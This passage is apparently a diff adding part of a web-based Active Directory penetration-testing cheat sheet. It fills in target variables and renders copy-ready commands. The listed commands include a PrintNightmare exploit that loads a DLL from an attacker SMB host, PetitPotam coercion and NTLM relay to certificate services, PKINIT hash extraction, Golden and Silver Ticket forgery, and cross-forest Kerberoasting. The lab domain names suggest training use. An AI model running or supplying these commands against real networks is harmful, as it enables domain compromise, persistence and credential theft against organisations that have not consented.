+{id:'CVE_006',phase:'domain-dominance',title:'PrintNightmare Host DLL',desc:'Host DLL via SMB for exploit',tool:'Impacket',os:'linux',noise:'low',auth:'none',
+cmd:'smbserver.py -smb2support CompData /path/to/backupscript.dll',
+failureIndicators:['Port in use'],
+notes:'SMB server for payload delivery'},
+
+{id:'CVE_007',phase:'domain-dominance',title:'PrintNightmare Exploit',desc:'Execute PrintNightmare exploit',tool:'CVE-2021-1675',os:'linux',noise:'high',auth:'required',
+cmd:"python3 CVE-2021-1675.py {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} '\\\\{ATTACKER_IP}\\CompData\\backupscript.dll'",
+failureIndicators:['Not vulnerable','Exploit failed'],
+warning:'Critical vulnerability exploit!',
+notes:'Requires specific Impacket version'},
+
+{id:'CVE_008',phase:'domain-dominance',title:'PetitPotam NTLM Relay',desc:'Relay captured auth to ADCS',tool:'Impacket',os:'linux',noise:'high',auth:'none',
+cmd:'ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController',
+failureIndicators:['SMB signing required','No incoming auth'],
+warning:'Requires SMB signing disabled!',
+notes:'Relay to AD Certificate Services'},
+
+{id:'CVE_009',phase:'domain-dominance',title:'PetitPotam Coerce',desc:'Coerce DC authentication',tool:'PetitPotam',os:'linux',noise:'high',auth:'none',
+cmd:'python3 PetitPotam.py {ATTACKER_IP} {DC_IP}',
+failureIndicators:['Coercion failed','Not vulnerable'],
+notes:'Force DC to authenticate to attacker'},
+
+{id:'CVE_010',phase:'domain-dominance',title:'PKINIT Get TGT',desc:'Request TGT using captured certificate',tool:'PKINITtools',os:'linux',noise:'low',auth:'none',
+cmd:'python3 /opt/PKINITtools/gettgtpkinit.py {DOMAIN}/{DC_NAME}$ -pfx-base64 <base64_cert> dc01.ccache',
+failureIndicators:['Invalid certificate','PKINIT not supported'],
+notes:'Convert certificate to TGT'},
+
+{id:'CVE_011',phase:'domain-dominance',title:'Set KRB5CCNAME',desc:'Set Kerberos ticket cache',tool:'Bash',os:'linux',noise:'low',auth:'none',
+cmd:'export KRB5CCNAME=dc01.ccache',
+failureIndicators:['File not found'],
+notes:'Required before using Kerberos ticket'},
+
+{id:'CVE_012',phase:'domain-dominance',title:'klist',desc:'View Kerberos ticket cache',tool:'klist',os:'both',noise:'low',auth:'none',
+cmd:'klist',
+failureIndicators:['No tickets in cache'],
+notes:'Verify ticket is loaded'},
+
+{id:'CVE_013',phase:'domain-dominance',title:'PKINIT Get NT Hash',desc:'Extract NT hash from certificate',tool:'PKINITtools',os:'linux',noise:'low',auth:'none',
+cmd:'python3 /opt/PKINITtools/getnthash.py -key <session_key> {DOMAIN}/{DC_NAME}$',
+failureIndicators:['Invalid key'],
+notes:'Get NT hash from machine certificate'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: PERSISTENCE - Tickets & Persistence
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'PERSIST_001',phase:'persistence',title:'Golden Ticket Impacket',desc:'Create Golden Ticket for persistent access',tool:'Impacket',os:'linux',noise:'low',auth:'none',
+cmd:'ticketer.py -nthash <KRBTGT_HASH> -domain {DOMAIN} -domain-sid <DOMAIN_SID> Administrator',
+failureIndicators:['Invalid hash','Wrong SID format'],
+notes:'Export KRB5CCNAME=Administrator.ccache to use'},
+
+{id:'PERSIST_002',phase:'persistence',title:'Golden Ticket Mimikatz',desc:'Create and inject Golden Ticket',tool:'Mimikatz',os:'windows',noise:'low',auth:'none',
+cmd:'mimikatz # kerberos::golden /user:Administrator /domain:{DOMAIN} /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt',
+failureIndicators:['Invalid parameters','AV detection'],
+notes:'/ptt injects ticket into current session'},
+
+{id:'PERSIST_003',phase:'persistence',title:'Silver Ticket Impacket',desc:'Create Silver Ticket for specific service',tool:'Impacket',os:'linux',noise:'low',auth:'none',
+cmd:'ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain {DOMAIN} -spn cifs/{TARGET_HOST} Administrator',
+failureIndicators:['Invalid hash','Wrong SPN format'],
+notes:'Only works for specified service'},
+
+{id:'PERSIST_004',phase:'persistence',title:'Rubeus TGT from Cert',desc:'Request TGT using certificate',tool:'Rubeus',os:'windows',noise:'low',auth:'none',
+cmd:'.\\Rubeus.exe asktgt /user:{DC_NAME}$ /certificate:<base64_cert> /ptt',
+failureIndicators:['Invalid certificate','PKINIT not supported'],
+notes:'Use captured certificate for authentication'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: CREDENTIAL ACCESS - Ticket Conversion & Cracking
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'CONV_001',phase:'credential-access',title:'Ticket Base64 Prep',desc:'Prepare base64 ticket for processing',tool:'Bash',os:'linux',noise:'low',auth:'none',
+cmd:"echo '<base64 blob>' | tr -d \\\\n",
+failureIndicators:['Invalid base64'],
+notes:'Remove newlines from base64 ticket'},
+
+{id:'CONV_002',phase:'credential-access',title:'Ticket Kirbi Decode',desc:'Convert base64 to kirbi format',tool:'Bash',os:'linux',noise:'low',auth:'none',
+cmd:'cat encoded_file | base64 -d > ticket.kirbi',
+failureIndicators:['Invalid base64','Decode error'],
+notes:'Create kirbi file from base64'},
+
+{id:'CONV_003',phase:'credential-access',title:'kirbi2john',desc:'Extract hash from kirbi for cracking',tool:'kirbi2john',os:'linux',noise:'low',auth:'none',
+cmd:'python2.7 kirbi2john.py ticket.kirbi',
+failureIndicators:['Invalid kirbi format'],
+notes:'Prepare ticket for John/Hashcat'},
+
+{id:'CONV_004',phase:'credential-access',title:'Hashcat Format Sed',desc:'Convert ticket hash to Hashcat format',tool:'sed',os:'linux',noise:'low',auth:'none',
+cmd:"sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file > hashcat_ready",
+failureIndicators:['Format error'],
+notes:'Prepare for hashcat -m 13100'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// PHASE: ENUMERATION - Cross-Domain & Foreign Trusts
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'XDOM_001',phase:'enumeration',title:'Get-DomainUser Child Domain',desc:'Enumerate users in child domain',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | Select SamAccountName',
+failureIndicators:['Domain not found','Trust error'],
+notes:'Enumerate across trust'},
+
+{id:'XDOM_002',phase:'enumeration',title:'Get-DomainUser SPN Foreign',desc:'Find SPNs in foreign domain',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | Select SamAccountName',
+failureIndicators:['Domain not found','No SPNs'],
+notes:'Cross-forest Kerberoasting targets'},
+
+{id:'XDOM_003',phase:'enumeration',title:'Get-DomainUser mssqlsvc',desc:'Enumerate specific service account in foreign domain',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | Select samaccountname,memberof',
+failureIndicators:['User not found','Domain error'],
+notes:'Target service accounts across trusts'},
+
+{id:'XDOM_004',phase:'enumeration',title:'Get-DomainForeignGroupMember Foreign',desc:'Find foreign users in domain groups',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL',
+failureIndicators:['No foreign members','Domain error'],
+notes:'Find users from other domains in local groups'},
+
+{id:'XDOM_005',phase:'credential-access',title:'GetUserSPNs Cross Forest',desc:'Kerberoast across forest trust',tool:'Impacket',os:'linux',noise:'med',auth:'required',
+cmd:'GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL {DOMAIN}/{USERNAME}',
+failureIndicators:['Trust error','No SPNs found'],
+notes:'Cross-forest Kerberoasting'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// Additional PowerView Functions
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'PV_EXTRA_001',phase:'enumeration',title:'Export-PowerViewCSV',desc:'Export results to CSV file',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser | Export-PowerViewCSV -Path users.csv',
+failureIndicators:['PowerView not loaded','Permission error'],
+notes:'Save enumeration results'},
+
+{id:'PV_EXTRA_002',phase:'enumeration',title:'ConvertTo-SID',desc:'Convert name to SID',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'ConvertTo-SID {USERNAME}',
+failureIndicators:['User not found'],
+notes:'Useful for ACL analysis'},
+
+{id:'PV_EXTRA_003',phase:'enumeration',title:'Get-DomainFileServer',desc:'Find likely file servers',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainFileServer',
+failureIndicators:['PowerView not loaded'],
+notes:'Identify file shares to target'},
+
+{id:'PV_EXTRA_004',phase:'enumeration',title:'Get-DomainDFSShare',desc:'Find DFS shares',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainDFSShare',
+failureIndicators:['No DFS found','PowerView not loaded'],
+notes:'Distributed File System enumeration'},
+
+{id:'PV_EXTRA_005',phase:'enumeration',title:'Get-NetShare',desc:'List shares on local machine',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-NetShare',
+failureIndicators:['PowerView not loaded'],
+notes:'Local share enumeration'},
+
+{id:'PV_EXTRA_006',phase:'enumeration',title:'ConvertFrom-SddlString',desc:'Convert SDDL to readable format',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:'ConvertFrom-SddlString -Sddl "<SDDL_STRING>"',
+failureIndicators:['Invalid SDDL'],
+notes:'Make ACL permissions readable'},
+
+{id:'PV_EXTRA_007',phase:'enumeration',title:'View Help Desk Group',desc:'View members of specific security group',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:"Get-ADGroup -Identity 'Help Desk Level 1' -Properties * | Select -ExpandProperty Members",
+failureIndicators:['Group not found','Module not loaded'],
+notes:'Check group membership'},
+
+{id:'PV_EXTRA_008',phase:'enumeration',title:'Get-DomainGPO Names',desc:'List all GPO display names',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainGPO | Select displayname',
+failureIndicators:['PowerView not loaded'],
+notes:'Quick GPO listing'},
+
+{id:'PV_EXTRA_009',phase:'enumeration',title:'PowerView Encryption Types',desc:'Check supported encryption types',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes',
+failureIndicators:['User not found','PowerView not loaded'],
+notes:'Check if RC4 or AES encryption'},
+
+{id:'PV_EXTRA_010',phase:'enumeration',title:'View User Membership',desc:'View all group memberships for user',tool:'PowerView',os:'windows',noise:'low',auth:'required',
+cmd:'Get-DomainUser -Identity {USERNAME} | Select samaccountname,objectsid,memberof,useraccountcontrol | fl',
+failureIndicators:['User not found','PowerView not loaded'],
+notes:'Full user membership info'},
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// Additional useful commands
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+{id:'MISC_001',phase:'reconnaissance',title:'Username Generation',desc:'Generate username combinations from names',tool:'Bash',os:'linux',noise:'low',auth:'none',
+cmd:"# Generate from names.txt (first last format)\nwhile read name; do\n  first=$(echo $name | cut -d' ' -f1 | tr '[:upper:]' '[:lower:]')\n  last=$(echo $name | cut -d' ' -f2 | tr '[:upper:]' '[:lower:]')\n  echo \"$first.$last\"\n  echo \"${first:0:1}$last\"\ndone < names.txt",
+failureIndicators:['File not found'],
+notes:'Customize based on target naming convention'},
+
+{id:'MISC_002',phase:'credential-access',title:'Inveigh Parameters',desc:'View Inveigh options',tool:'Inveigh',os:'windows',noise:'low',auth:'none',
+cmd:'(Get-Command Invoke-Inveigh).Parameters',
+failureIndicators:['Module not loaded'],
+notes:'Reference command'},
+
+{id:'MISC_003',phase:'credential-access',title:'NTLM Relay SMB',desc:'Relay captured NTLM authentication',tool:'Impacket',os:'linux',noise:'high',auth:'none',
+cmd:'ntlmrelayx.py -tf targets.txt -smb2support',
+failureIndicators:['SMB signing required','No incoming auth'],
+warning:'Requires SMB signing disabled on targets!',
+notes:'Use with Responder. Add -i for interactive shell'},
+
+{id:'MISC_004',phase:'tool-setup',title:'Kerbrute Make Help',desc:'Show Kerbrute build options',tool:'make',os:'linux',noise:'low',auth:'none',
+cmd:'make help',
+failureIndicators:['No Makefile'],
+notes:'View available build targets'},
+
+{id:'MISC_005',phase:'tool-setup',title:'Test Kerbrute Binary',desc:'Verify Kerbrute is working',tool:'Kerbrute',os:'linux',noise:'low',auth:'none',
+cmd:'./kerbrute_linux_amd64',
+failureIndicators:['Permission denied','Binary not found'],
+notes:'Should display help menu'},
+
+{id:'MISC_006',phase:'credential-access',title:'KerberosRequestorSecurityToken',desc:'Request TGS ticket manually',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
+cmd:"Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433'",
+failureIndicators:['SPN not found','Assembly error'],
+notes:'Native .NET Kerberoasting method'}
+
+];
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// INITIALIZATION
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+let currentPhase = null;
+
+document.addEventListener('DOMContentLoaded', () => {
+    loadState();
+    renderStateGrid();
+    renderDecisionTree();
+    renderPhaseTabs();
+    populateToolFilter();
+    filterAndRender();
+});
+
+function loadState() {
+    try {
+        const saved = localStorage.getItem('adEngineStateV4');
+        if (saved) Object.assign(STATE, JSON.parse(saved));
+        const savedCfg = localStorage.getItem('adEngineConfigV4');
+        if (savedCfg) Object.assign(CONFIG, JSON.parse(savedCfg));
+        // Populate config inputs
+        document.querySelectorAll('.config-field input').forEach(el => {
+            const key = el.id.replace('cfg', '');
+            const configKey = key.replace(/([A-Z])/g, '_$1').toUpperCase().replace(/^_/, '');
+            if (CONFIG[configKey]) el.value = CONFIG[configKey];
+        });
+    } catch(e) { console.error('Load error:', e); }
+}
+
+function saveState() {
+    try {
+        localStorage.setItem('adEngineStateV4', JSON.stringify(STATE));
+        localStorage.setItem('adEngineConfigV4', JSON.stringify(CONFIG));
+    } catch(e) {}
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// STATE MANAGEMENT
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+function updateState(axis, value) {
+    STATE[axis] = value;
+    if (axis === 'identityPresence') {
+        if (value === 'none' || value === 'usernames-only') {
+            STATE.privilegeCapability = 'unauthenticated';
+            STATE.credentialType = 'none';
+        }
+    }
+    if (axis === 'accessPosition' && value === 'internal-auth' && STATE.privilegeCapability === 'unauthenticated') {
+        STATE.privilegeCapability = 'authenticated-standard';
+    }
+    saveState();
+    renderStateGrid();
+    renderDecisionTree();
+    filterAndRender();
+}
+
+function updateConfig(key, value) {
+    CONFIG[key] = value;
+    // Auto-derive BASE_DN from DOMAIN
+    if (key === 'DOMAIN' && value) {
+        const parts = value.split('.');
+        CONFIG.BASE_DN = parts.map(p => 'DC=' + p).join(',');
+    }
+    // Auto-derive NETWORK from DC_IP
+    if (key === 'DC_IP' && value && /^\d+\.\d+\.\d+\.\d+$/.test(value)) {
+        CONFIG.NETWORK = value.split('.').slice(0, 3).join('.');
+    }
+    saveState();
+    filterAndRender();
+}
+
+function resetAll() {
+    Object.keys(STATE).forEach(k => STATE[k] = null);
+    Object.keys(CONFIG).forEach(k => CONFIG[k] = '');
+    document.querySelectorAll('.config-field input').forEach(i => i.value = '');
+    saveState();
+    renderStateGrid();
+    renderDecisionTree();
+    filterAndRender();
+}
+
+function setMode(mode) {
+    MODE = mode;
+    document.getElementById('btnGuided').classList.toggle('active', mode === 'guided');
+    document.getElementById('btnExpert').classList.toggle('active', mode === 'expert');
+    filterAndRender();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// RENDERING
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+function renderStateGrid() {
+    const grid = document.getElementById('stateGrid');
+    const items = [
+        {lbl: 'Access', val: STATE.accessPosition},
+        {lbl: 'Identity', val: STATE.identityPresence},
+        {lbl: 'Cred Type', val: STATE.credentialType},
+        {lbl: 'Privilege', val: STATE.privilegeCapability},
+        {lbl: 'OPSEC', val: STATE.opsecPosture},
+        {lbl: 'Environment', val: STATE.environmentContext}
+    ];
+    grid.innerHTML = items.map(i => 
+        `<div class="state-row"><span class="lbl">${i.lbl}</span><span class="val ${i.val ? '' : 'unset'}">${i.val || 'Not set'}</span></div>`
+    ).join('');
+}
+
+function renderDecisionTree() {
+    const tree = document.getElementById('decisionTree');
+    tree.innerHTML = '';
+    
+    Object.values(AXES).forEach(axis => {
+        const isDone = STATE[axis.id] !== null;
+        const isActive = !isDone && Object.values(AXES).findIndex(a => STATE[a.id] === null) === Object.values(AXES).indexOf(axis);
+        
+        const node = document.createElement('div');
+        node.className = `decision-node ${isDone ? 'done' : ''} ${isActive ? 'active' : ''} ${!isDone && !isActive ? 'locked' : ''}`;
+        
+        node.innerHTML = `
+            <span class="node-axis">${axis.axis}</span>
+            <span class="node-q">${axis.question}</span>
+            <div class="node-opts">
+                ${axis.options.map(opt => `
+                    <button class="node-opt ${STATE[axis.id] === opt.value ? 'sel' : ''}" 
+                            onclick="updateState('${axis.id}', '${opt.value}')">
+                        ${opt.icon} ${opt.label}
+                    </button>
+                `).join('')}
+            </div>
+        `;
+        tree.appendChild(node);
+    });
+}
+
+function renderPhaseTabs() {
+    const tabs = document.getElementById('phaseTabs');
+    const phaseCounts = {};
+    COMMANDS.forEach(c => {
+        phaseCounts[c.phase] = (phaseCounts[c.phase] || 0) + 1;
+    });
+    
+    tabs.innerHTML = `
+        <button class="phase-tab ${!currentPhase ? 'active' : ''}" onclick="setPhase(null)">
+            All<span class="cnt">${COMMANDS.length}</span>
+        </button>
+        ${PHASES.map(p => `
+            <button class="phase-tab ${currentPhase === p.id ? 'active' : ''}" onclick="setPhase('${p.id}')">
+                ${p.icon} ${p.name}<span class="cnt">${phaseCounts[p.id] || 0}</span>
+            </button>
+        `).join('')}
+    `;
+}
+
+function setPhase(phase) {
+    currentPhase = phase;
+    renderPhaseTabs();
+    filterAndRender();
+}
+
+function populateToolFilter() {
+    const tools = [...new Set(COMMANDS.map(c => c.tool).filter(Boolean))].sort();
+    const select = document.getElementById('filterTool');
+    tools.forEach(t => {
+        const opt = document.createElement('option');
+        opt.value = t;
+        opt.textContent = t;
+        select.appendChild(opt);
+    });
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+// FILTERING
+// ═══════════════════════════════════════════════════════════════════════════════════════════
+
+function filterAndRender() {
+    const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+    const osFilter = document.getElementById('filterOs').value;
+    const noiseFilter = document.getElementById('filterNoise').value;
+    const authFilter = document.getElementById('filterAuth').value;
+    const toolFilter = document.getElementById('filterTool').value;
+    
+    let filtered = COMMANDS.filter(cmd => {
+        // Phase filter
+        if (currentPhase && cmd.phase !== currentPhase) return false;
+        
+        // Search filter
+        if (searchTerm) {
+            const searchable = `${cmd.title} ${cmd.desc} ${cmd.tool} ${cmd.id} ${cmd.cmd}`.toLowerCase();
+            if (!searchable.includes(searchTerm)) return false;
+        }
+        
+        // OS filter
+        if (osFilter && cmd.os !== osFilter && cmd.os !== 'both') return false;
+        
+        // Noise filter
+        if (noiseFilter && cmd.noise !== noiseFilter) return false;
+        
+        // Auth filter
+        if (authFilter && cmd.auth !== authFilter) return false;
+        
+        // Tool filter
+        if (toolFilter && cmd.tool !== toolFilter) return false;
+        
+        return true;
+    });
+    
+    renderCommands(filtered);
+    updateStats(filtered);
+}
+
+function updateStats(filtered) {
+    document.getElementById('statTotal').textContent = COMMANDS.length;
+    document.getElementById('statMatch').textContent = filtered.length;
+    
+    const ready = filtered.filter(cmd => {
+        let cmdText = substituteVariables(cmd.cmd);
+        return !cmdText.includes('{') && !cmdText.includes('<');
+    }).length;
+    document.getElementById('statReady').textContent = ready;
+}
+
+function substituteVariables(cmdText) {
+    let result = cmdText;
+    Object.entries(CONFIG).forEach(([key, value]) => {
+        if (value) {
+            result = result.replace(new RegExp(`\\{${key}\\}`, 'g'), value);
+        }
+    });
+    return result;
+}
+
+function renderCommands(commands) {
+    const container = document.getElementById('commandsContainer');
+    
+    if (commands.length === 0) {
+        container.innerHTML = `
+            <div class="empty">
+                <div class="icon">🔍</div>
+                <h3>No Commands Match</h3>
+                <p>Adjust your filters to see available commands.</p>
+            </div>
+        `;
+        return;
+    }
+    
+    // Group by phase
+    const byPhase = {};
+    commands.forEach(cmd => {
+        if (!byPhase[cmd.phase]) byPhase[cmd.phase] = [];
+        byPhase[cmd.phase].push(cmd);
+    });
+    
+    let html = '';
+    PHASES.forEach(phase => {
+        const phaseCmds = byPhase[phase.id];
+        if (!phaseCmds || phaseCmds.length === 0) return;
+        
+        html += `
+            <div style="margin-bottom: 24px;">
+                <h3 style="color: var(--red); font-size: 14px; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px;">
+                    ${phase.icon} ${phase.name} (${phaseCmds.length})
+                </h3>
+                <div class="cmd-grid">
+                    ${phaseCmds.map(cmd => renderCommandCard(cmd)).join('')}
+                </div>
+            </div>
+        `;
+    });
+    
+    container.innerHTML = html;
+}
+
+function renderCommandCard(cmd) {
+    const cmdText = substituteVariables(cmd.cmd);
+    const isReady = !cmdText.includes('{') && !cmdText.includes('<');
+    const noiseClass = cmd.noise === 'high' ? 'noisy' : cmd.noise === 'low' ? 'stealthy' : 'moderate';
+    
+    return `
+        <div class="cmd-card ${noiseClass}" id="card-${cmd.id}">
+            <div class="card-head">
+                <div>
+                    <div class="card-title">${cmd.title}</div>
+                    <div class="card-id">${cmd.id}</div>
+                </div>
+                <div class="card-badges">
+                    <span class="badge badge-os-${cmd.os === 'both' ? 'both' : cmd.os}">${cmd.os.toUpperCase()}</span>
+                    <span class="badge badge-noise-${cmd.noise}">${cmd.noise.toUpperCase()}</span>
+                    <span class="badge badge-auth-${cmd.auth}">${cmd.auth === 'none' ? 'NO CREDS' : 'CREDS'}</span>
+                </div>
+            </div>
+            <div class="card-desc">${cmd.desc}</div>
+            <div class="card-meta">
+                <span class="meta-tag">🔧 ${cmd.tool}</span>
+            </div>
+            ${cmd.warning ? `<div class="warning-box">⚠️ ${cmd.warning}</div>` : ''}
+            <div class="cmd-box">
+                <div class="cmd-text">${escapeHtml(cmdText)}</div>
+            </div>
+            ${cmd.failureIndicators ? `
+                <div class="failure-box">
+                    <strong>Failure Indicators:</strong> ${Array.isArray(cmd.failureIndicators) ? cmd.failureIndicators.join('; ') : cmd.failureIndicators}
+                </div>
+            ` : ''}
+            ${cmd.notes ? `
+                <div class="notes-box">
+                    <strong>Notes:</strong> ${cmd.notes}
+                </div>
+            ` : ''}
+            <div class="card-actions">
+                <button class="copy-btn" onclick="copyCmd('${cmd.id}')">
+                    ${isReady ? '✓ Copy Ready Command' : '📋 Copy (Variables Remain)'}
+                </button>
+            </div>
+        </div>
+    `;
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+function copyCmd(id) {
+    const cmd = COMMANDS.find(c => c.id === id);
+    if (!cmd) return;
+    
+    const cmdText = substituteVariables(cmd.cmd);
+    
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(cmdText).then(() => showCopyFeedback(id));
+    } else {
+        const textarea = document.createElement('textarea');
+        textarea.value = cmdText;
+        textarea.style.position = 'fixed';
+        textarea.style.left = '-9999px';
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        showCopyFeedback(id);
+    }
+}
+
+function showCopyFeedback(id) {
+    showToast('✓ Copied!');
+    const card = document.getElementById('card-' + id);
+    if (card) {
+        card.classList.add('copied');
+        setTimeout(() => card.classList.remove('copied'), 1500);
+    }
+}
+
+function showToast(msg) {
+    const toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+}
+
+function exportBash() {
+    let script = '#!/bin/bash\n# AD PenTest Variables - Generated by AD Intelligence Engine v4.0\n\n';
+    Object.entries(CONFIG).forEach(([k, v]) => {
+        if (v) script += `export ${k}="${v}"\n`;
+    });
+    
+    const blob = new Blob([script], {type: 'text/plain'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'ad-vars.sh';
+    a.click();
+    URL.revokeObjectURL(url);
+    showToast('✓ Exported!');
+}
+
+</script>
+</body>
+</html>
